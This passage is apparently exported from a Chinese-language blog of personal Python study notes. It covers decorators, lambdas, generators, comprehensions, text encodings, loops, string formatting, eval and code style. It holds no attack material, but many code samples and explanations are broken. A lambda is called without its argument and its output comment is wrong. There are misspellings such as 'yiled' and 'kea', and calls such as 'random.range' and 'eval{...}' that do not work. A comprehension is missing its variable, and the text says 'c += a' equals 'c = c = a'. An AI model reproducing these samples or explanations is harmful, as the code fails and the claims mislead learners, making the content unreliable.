<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">origin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        <span class="comment">#执行前</span></span><br><span class="line">        res = origin(*args,**kwargs)</span><br><span class="line">        <span class="comment">#执行后</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@outer </span><span class="comment">#func = outer(func)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure>

<p>在不修改原函数内部和调用方式的情况下，使用装饰器。</p>
<h2 id="9-匿名函数"><a href="#9-匿名函数" class="headerlink" title="9.匿名函数"></a>9.匿名函数</h2><p>匿名函数，是基于lambda表达式实现定义一个可以没有名字的函数，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_list = [<span class="keyword">lambda</span> x:x+<span class="number">100</span>,<span class="keyword">lambda</span> x:x+<span class="number">110</span>,<span class="keyword">lambda</span>]</span><br><span class="line"><span class="built_in">print</span>(data_list[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h3 id="9-1定义"><a href="#9-1定义" class="headerlink" title="9.1定义"></a>9.1定义</h3><p>基于lambda定义的函数格式为：lambda 参数 :函数体</p>
<p>参数，支持任意参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> x:函数体</span><br><span class="line"><span class="keyword">lambda</span> x1,x2:函数体</span><br><span class="line"><span class="keyword">lambda</span> *args,**kwargs:函数体</span><br></pre></td></tr></table></figure>

<p>函数体，只能支持单行代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> xx:x + <span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>返回值，默认将函数体单行代码执行的结果返回给执行函数的地方。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func = <span class="keyword">lambda</span> x:x+<span class="number">100</span></span><br><span class="line">v1 = func()</span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#110</span></span><br></pre></td></tr></table></figure>

<h2 id="10-生成器"><a href="#10-生成器" class="headerlink" title="10.生成器"></a>10.生成器</h2><p>生成器是由函数+yield关键字创造出来的写法，在特定情况下，用它可以帮助我们节省内存。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="number">111</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span><span class="comment">#可以防止任何类型的数据，出现yield关键字之后，这个函数就变成了生成器函数。</span></span><br></pre></td></tr></table></figure>

<p>执行生成器函数的时候，函数体默认不会被执行；返回的是一个生成器对象。</p>
<p>下面结合案例说明生成器函数的作用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">123</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">234</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    yiled <span class="number">345</span></span><br><span class="line">v1 = func()<span class="comment">#执行生成器函数时，函数体默认不会被执行，返回的是一个生成器对象。</span></span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">next</span>(v1)<span class="comment">#在next中执行生成器对象，进入生成器函数并执行其中的代码</span></span><br><span class="line"><span class="built_in">print</span>(n1)</span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">next</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(n1)</span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">next</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(n1)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;generator object func at 0x000001F71903CD60&gt;</span></span><br><span class="line"><span class="string">1  执行第一次的结果</span></span><br><span class="line"><span class="string">123返回第一个关键词后面的内容</span></span><br><span class="line"><span class="string">2   执行第二次的结果</span></span><br><span class="line"><span class="string">234   返回第二个关键词的内容</span></span><br><span class="line"><span class="string">3   执行第三次的结果</span></span><br><span class="line"><span class="string">345   返回第三个关键词的内容</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="10-1应用场景"><a href="#10-1应用场景" class="headerlink" title="10.1应用场景"></a>10.1应用场景</h3><p>假设要让你生成300w个随即的四位数，并打印出来。</p>
<p>1.在内存中一次创建300w个。</p>
<p>2.动态创建，用一个创建一个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">val = random.<span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="built_in">print</span>(val)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">data_list = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000000</span>):</span><br><span class="line">    val = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line">    data_list.append(val)</span><br><span class="line"><span class="comment">#在使用时，从列表中取即可。</span></span><br></pre></td></tr></table></figure>

<p>而使用生成器的话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num</span>(<span class="params">max_count</span>):</span></span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> counter &lt; max_count:</span><br><span class="line">        <span class="keyword">yield</span> random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">data_list = num(<span class="number">3000000</span>)</span><br><span class="line">n1 = <span class="built_in">next</span>(data_list)</span><br><span class="line">n2 = <span class="built_in">next</span>(data_list)<span class="comment">#一边使用，一边生成，节省了大量的内存。</span></span><br></pre></td></tr></table></figure>

<p>所以在以后遇到，先生成再用，一边生成再用的时候，要想到生成器。</p>
<h3 id="10-2基于for循环"><a href="#10-2基于for循环" class="headerlink" title="10.2基于for循环"></a>10.2基于for循环</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = func()</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>

<h2 id="11-推导式"><a href="#11-推导式" class="headerlink" title="11.推导式"></a>11.推导式</h2><p>推导式，是python中提供的一个非常方便的功能，可以让我们通过一行代码实现创建，list,dict,tuple,set的同时初始化一些值。</p>
<p>列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]<span class="comment">#创建了零到九的一个列表</span></span><br><span class="line"><span class="built_in">print</span>(num_list)</span><br><span class="line"><span class="comment">#[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure>

<p>字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num_list = &#123;i:i <span class="keyword">for</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;</span><br><span class="line">num_list2 = &#123;i:(i,<span class="number">11</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>推导式的一个拓展（除去末尾的mp4）</p>
<p><img src="/2022/01/03/%E4%B8%83%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%87%BD%E6%95%B0/image-20220103205854535.png" alt="image-20220103205854535"></p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>三、学习py： 代码的运行方式 进制 计算机中的单位 编码</title>
    <url>/2021/12/28/%E4%B8%89%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A-%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F-%E8%BF%9B%E5%88%B6-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E5%8D%95%E4%BD%8D-%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h1 id="三、学习py：-代码的运行方式-进制-计算机中的单位-编码"><a href="#三、学习py：-代码的运行方式-进制-计算机中的单位-编码" class="headerlink" title="三、学习py： 代码的运行方式 进制 计算机中的单位 编码"></a>三、学习py： 代码的运行方式 进制 计算机中的单位 编码</h1><h2 id="1-python代码的运行方式"><a href="#1-python代码的运行方式" class="headerlink" title="1.python代码的运行方式"></a>1.python代码的运行方式</h2><h3 id="1-1脚本式"><a href="#1-1脚本式" class="headerlink" title="1.1脚本式"></a>1.1脚本式</h3><p>文件，用解释器运行。</p>
<p>本质上pycharm也是脚本式。</p>
<h3 id="1-2交互式"><a href="#1-2交互式" class="headerlink" title="1.2交互式"></a>1.2交互式</h3><p>在终端直接进入python解释器，即为交互式。（也可以称进入了py的交互式环境。）</p>
<p>在pycharm中进入Terminal 也可以进入交互式环境。</p>
<h2 id="2-进制"><a href="#2-进制" class="headerlink" title="2.进制"></a>2.进制</h2><p>计算机中底层所有的数据都是以二进制存在。</p>
<h2 id="3-计算机中的单位"><a href="#3-计算机中的单位" class="headerlink" title="3.计算机中的单位"></a>3.计算机中的单位</h2><h3 id="3-1单位b-bit-位"><a href="#3-1单位b-bit-位" class="headerlink" title="3.1单位b(bit),位"></a>3.1单位b(bit),位</h3><p>1,1位</p>
<p>101，3位</p>
<h3 id="3-2单位B（byte），字节"><a href="#3-2单位B（byte），字节" class="headerlink" title="3.2单位B（byte），字节"></a>3.2单位B（byte），字节</h3><p>8位是一个字节</p>
<h3 id="3-3单位KB（kilobyte），千字节"><a href="#3-3单位KB（kilobyte），千字节" class="headerlink" title="3.3单位KB（kilobyte），千字节"></a>3.3单位KB（kilobyte），千字节</h3><p>1024个字节就是1KB</p>
<h3 id="3-4单位m-g-t"><a href="#3-4单位m-g-t" class="headerlink" title="3.4单位m g t"></a>3.4单位m g t</h3><h2 id="4-编码"><a href="#4-编码" class="headerlink" title="4.编码"></a>4.编码</h2><p>编码，文字和二进制之间的一个对照表。</p>
<h3 id="4-1-ASCII编码"><a href="#4-1-ASCII编码" class="headerlink" title="4.1 ASCII编码"></a>4.1 ASCII编码</h3><p>ascii码规定使用一个字节来表示字母与二进制的对应关系。</p>
<h3 id="4-2-gb-2312编码"><a href="#4-2-gb-2312编码" class="headerlink" title="4.2 gb-2312编码"></a>4.2 gb-2312编码</h3><p>gb-2312编码，只有中文的文字。</p>
<p>gbk编码，对gb2312进行扩展，包含了中日韩等文字。（其中包含了两万多的对应关系）</p>
<h3 id="4-3Unicode"><a href="#4-3Unicode" class="headerlink" title="4.3Unicode"></a>4.3Unicode</h3><p>Unicode也被称为万国码，为全球的每个文字都分配了一个码位（二进制表示）。</p>
<p>ucs2：用两个字节表示一个文字</p>
<p>ucs4：用四个字节表示一个文字</p>
<h3 id="4-4-utf-8编码"><a href="#4-4-utf-8编码" class="headerlink" title="4.4 utf-8编码"></a>4.4 utf-8编码</h3><p>包含了所有文字与二进制对应的关系，也是全球应用最广泛的一种编码。</p>
<p>本质上：utf-8是对Unicode的一种压缩，用尽量少的二进制去与文字进行对应。</p>
<h3 id="4-5python相关的代码"><a href="#4-5python相关的代码" class="headerlink" title="4.5python相关的代码"></a>4.5python相关的代码</h3><p>字符串（str） “dhk是一个小丑”   Unicode处理  一般在内存</p>
<p>字节（byte）   “dongganshixiaochou“    utf-8编码  or  gbk编码   一般用于文件  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;越江&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">v2 = <span class="string">&quot;越江&quot;</span>.encode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="comment">#将文字转化为编码</span></span><br></pre></td></tr></table></figure>

<p>将一个字符串写入到一个文件中。所以在存储写入文件的时候，需要把str转化为utf-8.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;dhk是一个小丑&quot;</span></span><br><span class="line">data = name.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="comment">#打开一个文件</span></span><br><span class="line">file_object = <span class="built_in">open</span>(<span class="string">&quot;log.txt&quot;</span>,mode = <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="comment">#在文件中写内容</span></span><br><span class="line">file_object.write(data)</span><br><span class="line"><span class="comment">#关闭文件</span></span><br><span class="line">file_object.close()</span><br></pre></td></tr></table></figure>

<p>file函数的相关操作：<a href="https://www.runoob.com/python/file-methods.html">Python File(文件) 方法 | 菜鸟教程 (runoob.com)</a></p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>二、学习py：循环语句（while）break continue 字符串格式化 运算符</title>
    <url>/2021/12/28/%E4%BA%8C%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%EF%BC%88while%EF%BC%89break-continue-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96-%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="二、学习py：循环语句（while）break-continue-字符串格式化-运算符"><a href="#二、学习py：循环语句（while）break-continue-字符串格式化-运算符" class="headerlink" title="二、学习py：循环语句（while）break continue 字符串格式化 运算符"></a>二、学习py：循环语句（while）break continue 字符串格式化 运算符</h2><h2 id="1-1while循环格式"><a href="#1-1while循环格式" class="headerlink" title="1.1while循环格式"></a>1.1while循环格式</h2><p>while  条件 :</p>
<p>​    代码    </p>
<p>其中若是while中的条件一直成立，则会一直执行代码块。</p>
<h2 id="1-2-定义布尔类型的时候记得首字母大写"><a href="#1-2-定义布尔类型的时候记得首字母大写" class="headerlink" title="1.2.定义布尔类型的时候记得首字母大写"></a>1.2.定义布尔类型的时候记得首字母大写</h2><h2 id="1-3-break"><a href="#1-3-break" class="headerlink" title="1.3.break"></a>1.3.break</h2><p>用于在while循环中帮助你终止循环，也就是说while代码中，break后面的代码则不会执行，当前循环立即终止。（所以学会了两种方式终止循环，条件判断和break终止）</p>
<h2 id="1-4-continue"><a href="#1-4-continue" class="headerlink" title="1.4.continue"></a>1.4.continue</h2><p>在循环中用于结束本次循环，开始下一次循环。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> 	<span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hi&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>你好</p>
<p>你好</p>
<p>你好</p>
<p>…</p>
<h3 id="ex2"><a href="#ex2" class="headerlink" title="ex2:"></a>ex2:</h3><p><img src="/2021/12/28/%E4%BA%8C%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%EF%BC%88while%EF%BC%89break-continue-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96-%E8%BF%90%E7%AE%97%E7%AC%A6/image-20211228165707621.png" alt="image-20211228165707621"></p>
<h3 id="ex3"><a href="#ex3" class="headerlink" title="ex3"></a>ex3</h3><p><img src="/2021/12/28/%E4%BA%8C%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%EF%BC%88while%EF%BC%89break-continue-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96-%E8%BF%90%E7%AE%97%E7%AC%A6/image-20211228170016635.png" alt="image-20211228170016635"></p>
<h2 id="1-5-while-else"><a href="#1-5-while-else" class="headerlink" title="1.5 while else"></a>1.5 while else</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件：</span><br><span class="line"></span><br><span class="line">​    代码</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​    代码</span><br></pre></td></tr></table></figure>

<p>注：如果用break跳出代码，else在条件成立的时候依然不会执行。也就是说else只会在条件不成立的时候执行。</p>
<h2 id="2-字符串格式化"><a href="#2-字符串格式化" class="headerlink" title="2.字符串格式化"></a>2.字符串格式化</h2><p>使用更加便携的形式实现字符串的拼接。</p>
<h2 id="2-1"><a href="#2-1" class="headerlink" title="2.1 %"></a>2.1 %</h2><h4 id="2-1-1基本格式化操作-基于循序"><a href="#2-1-1基本格式化操作-基于循序" class="headerlink" title="2.1.1基本格式化操作(基于循序)"></a>2.1.1基本格式化操作(基于循序)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;越江&quot;</span></span><br><span class="line"></span><br><span class="line">age = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;我叫%s ，今年%s岁.&quot;</span> %(name,age)</span><br></pre></td></tr></table></figure>

<p>占位符分类：</p>
<p>%s：字符串</p>
<p>%d：整型</p>
<h4 id="2-1-2基于名字的排序"><a href="#2-1-2基于名字的排序" class="headerlink" title="2.1.2基于名字的排序"></a>2.1.2基于名字的排序</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;%(name)s，你好！&quot;</span>%&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-1-3如果内容中包含了百分号"><a href="#2-1-3如果内容中包含了百分号" class="headerlink" title="2.1.3如果内容中包含了百分号"></a>2.1.3如果内容中包含了百分号</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;%s,这个东西我下了90%%了，但是断网了！&quot;</span>%<span class="string">&quot;兄弟&quot;</span></span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>

<p>注：要在内容的百分号后面多加一个百分号（也就是要用两个百分号）。</p>
<h2 id="2-2-format（推荐）"><a href="#2-2-format（推荐）" class="headerlink" title="2.2 format（推荐）"></a>2.2 format（推荐）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;我叫&#123;0&#125;,今年&#123;1&#125;岁,真正的名字叫做&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;越江&quot;</span>,<span class="string">&quot;99&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;我叫&#123;n1&#125;&quot;</span>.<span class="built_in">format</span>(n1 = <span class="string">&quot;越江&quot;</span>)</span><br><span class="line"><span class="comment">#data = text.format(n1=&quot;越江&quot;)</span></span><br><span class="line"><span class="comment">#模板复用</span></span><br></pre></td></tr></table></figure>



<h2 id="2-3-f-其實我個人更喜歡這種"><a href="#2-3-f-其實我個人更喜歡這種" class="headerlink" title="2.3 f(其實我個人更喜歡這種)"></a>2.3 f(其實我個人更喜歡這種)</h2><p>到python3.6版本之后，更便捷。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dhk = <span class="string">&quot;動感&quot;</span></span><br><span class="line">age = <span class="number">12</span></span><br><span class="line">text = <span class="string">f&quot;<span class="subst">&#123;dhk&#125;</span>是一個小丑，今年<span class="subst">&#123;age:#b&#125;</span>岁了&quot;</span></span><br><span class="line"><span class="comment">#将数字转换成二进制进行显示（一个扩展罢了，其中进制的代表符号和数电里面一样。）</span></span><br></pre></td></tr></table></figure>

<h2 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3.运算符"></a>3.运算符</h2><h3 id="3-1一些平时见过的运算符"><a href="#3-1一些平时见过的运算符" class="headerlink" title="3.1一些平时见过的运算符"></a>3.1一些平时见过的运算符</h3><p>// 取整除</p>
<p>** 幂</p>
<p>c += a  等效于 c = c = a（其他运算符也以此类推）</p>
<h3 id="3-1-2成员运算"><a href="#3-1-2成员运算" class="headerlink" title="3.1.2成员运算"></a>3.1.2成员运算</h3><p>in 如果在指定序列中找到值返回True</p>
<p>not in 就是in的取反</p>
<h3 id="3-1-3逻辑运算的优先级"><a href="#3-1-3逻辑运算的优先级" class="headerlink" title="3.1.3逻辑运算的优先级"></a>3.1.3逻辑运算的优先级</h3><p>加减乘除&gt;比较&gt;not and or</p>
<p>and 优先级是在 or 前面</p>
<p>如果要改变则使用圆括号进行改变（就和小学的加减乘除一样。）</p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>二、拓展py：eval函数拓展</title>
    <url>/2022/01/05/%E4%BA%8C%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9Aeval%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h1 id="二、拓展py：eval-isinstance函数拓展"><a href="#二、拓展py：eval-isinstance函数拓展" class="headerlink" title="二、拓展py：eval isinstance函数拓展"></a>二、拓展py：eval isinstance函数拓展</h1><h2 id="1-eval函数的简介和语法："><a href="#1-eval函数的简介和语法：" class="headerlink" title="1 eval函数的简介和语法："></a>1 eval函数的简介和语法：</h2><p>eval()函数用来执行一个字符串表达式，并返回表达式的值。还可以把字符串转化为list、tuple、dict。</p>
<p>eval函数的语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(expression[,<span class="built_in">globals</span>[,<span class="built_in">locals</span>]])</span><br></pre></td></tr></table></figure>


<p>参数：</p>
<p>expression：表达式。</p>
<p>globals：变量作用域，如果被提供，必须是一个字典对象。</p>
<p>locals：变量作用域，如果被提供，可以是任何映射对象。</p>
<h2 id="2-eval-函数使用实例："><a href="#2-eval-函数使用实例：" class="headerlink" title="2 eval()函数使用实例："></a>2 eval()函数使用实例：</h2><p>1 字符串转换成列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;[1,2,3,4,5]&quot;</span></span><br><span class="line">b=<span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a是字符串类型数据，b是列表类型数据</span></span><br></pre></td></tr></table></figure>

<p>2 字符串转换成字典 ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;&#123;&quot;</span>name<span class="string">&quot;:&quot;</span>guo<span class="string">&quot;,&quot;</span>age<span class="string">&quot;:25&#125;&quot;</span></span><br><span class="line">b=<span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a为字符串类型数据，b为字典类型数据</span></span><br></pre></td></tr></table></figure>

<p>3 字符串转换为元组：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;(1,2,3,4,5)&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a的数据结构是字符串 b的数据结构是元组</span></span><br></pre></td></tr></table></figure>

<p>4 eval()返回表达式的值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="number">4</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;3*x&quot;</span>)</span><br><span class="line"><span class="comment">#返回值为12</span></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>&#123;<span class="string">&quot;a+1&quot;</span>,g&#125;</span><br><span class="line"><span class="comment">#返回值为  5</span></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">b=<span class="number">20</span></span><br><span class="line">c=<span class="number">30</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">8</span>&#125;</span><br><span class="line">t=&#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">100</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;a+b+c&#x27;</span>,g,t)</span><br><span class="line"><span class="comment">#返回值为116</span></span><br></pre></td></tr></table></figure>

<h2 id="3-isinstance"><a href="#3-isinstance" class="headerlink" title="3.isinstance()"></a>3.isinstance()</h2><p>isinstance(变量名,类型)</p>
<p>返回布尔值</p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>五、学习py：代码规范 知识补充（pass is 位运算）</title>
    <url>/2021/12/30/%E4%BA%94%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83-%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85%EF%BC%88pass-is-%E4%BD%8D%E8%BF%90%E7%AE%97%EF%BC%89/</url>
    <content><![CDATA[<h1 id="五、学习py：代码规范-知识补充（pass-is-位运算）"><a href="#五、学习py：代码规范-知识补充（pass-is-位运算）" class="headerlink" title="五、学习py：代码规范 知识补充（pass is 位运算）"></a>五、学习py：代码规范 知识补充（pass is 位运算）</h1><h2 id="1-代码规范"><a href="#1-代码规范" class="headerlink" title="1.代码规范"></a>1.代码规范</h2><h3 id="1-1名称"><a href="#1-1名称" class="headerlink" title="1.1名称"></a>1.1名称</h3><p>文件夹，小写&amp;小写下划线连接</p>
<p>文件，小写&amp;小写下划线连接</p>
<p>变量：全局变量首字母用大写</p>
<p>局部变量首字母用小写</p>
<h3 id="1-2注释"><a href="#1-2注释" class="headerlink" title="1.2注释"></a>1.2注释</h3><p>文件注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这个文件的主要功能是：。。。。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>代码注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;dhk is a jocker!&quot;)#打印一串文字</span><br></pre></td></tr></table></figure>

<h3 id="1-3todo"><a href="#1-3todo" class="headerlink" title="1.3todo"></a>1.3todo</h3><p>基于注释可以实现todo注释的效果，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func():</span><br><span class="line">    #循环语句</span><br><span class="line">    for i in range(10):</span><br><span class="line">    print(i)</span><br><span class="line">    &quot;&quot;&quot;TODO v1版本为实现，后续在v1.1中会进行更新。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="1-4条件嵌套"><a href="#1-4条件嵌套" class="headerlink" title="1.4条件嵌套"></a>1.4条件嵌套</h3><p>写条件嵌套的时候最好不要超过第三层。</p>
<h3 id="1-5简单的逻辑先处理"><a href="#1-5简单的逻辑先处理" class="headerlink" title="1.5简单的逻辑先处理"></a>1.5简单的逻辑先处理</h3><h3 id="1-6循环"><a href="#1-6循环" class="headerlink" title="1.6循环"></a>1.6循环</h3><p>尽量少循环多干事，提高代码效率</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">将字典中的键和值分别放在两个列表里</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">key_list = []</span><br><span class="line">value_list = []</span><br><span class="line">info = &#123;<span class="string">&quot;dhk&quot;</span>:<span class="number">2</span>,<span class="string">&quot;joker&quot;</span>:<span class="number">3</span>,<span class="string">&quot;动感&quot;</span>:<span class="number">4</span>&#125;</span><br><span class="line"><span class="comment">#循环结构</span></span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> info.items():</span><br><span class="line">    key_list.append(kea)</span><br><span class="line">    value_list.append(value)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">将字典中的键和值分别放在两个列表里</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">info = &#123;<span class="string">&quot;dhk&quot;</span>:<span class="number">2</span>,<span class="string">&quot;joker&quot;</span>:<span class="number">3</span>,<span class="string">&quot;动感&quot;</span>:<span class="number">4</span>&#125;</span><br><span class="line">key_list = <span class="built_in">list</span>(info.keys())</span><br><span class="line">value_list = <span class="built_in">list</span>(info.values())</span><br></pre></td></tr></table></figure>

<p>上面虽然看着下面的代码简洁一些，但是上面的代码只循环了一次，而下面的代码循环了两次，所以上面的代码要简介一些。</p>
